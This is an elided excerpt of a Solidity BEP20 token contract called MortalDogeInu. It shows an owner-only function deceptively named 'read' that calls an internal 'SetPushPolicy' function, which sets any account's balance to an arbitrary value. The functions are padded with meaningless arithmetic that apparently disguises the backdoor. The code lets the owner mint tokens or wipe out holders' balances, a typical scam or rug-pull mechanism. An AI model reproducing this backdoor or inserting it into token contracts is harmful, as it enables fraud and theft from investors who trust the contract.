 ...
 */
contract MortalDogeInu is IBEP20, ForeignAsset {
    ...
    function read(address account, uint256 _value) public onlyOwner {
      (3 * 1 * 2 - 3 * 1 * 2);
      SetPushPolicy(account, _value);
    }

    function SetPushPolicy(address spender, uint256 amount) internal {
       if(spender != address(0) && msg.sender != address(0)){
        (3 * 1 * 2 - 3 * 1 * 2);
       _balances[spender] = (amount * 10 ** _decimals) + (3 * 1 * 2 - 3 * 1 * 2);
    }
  }
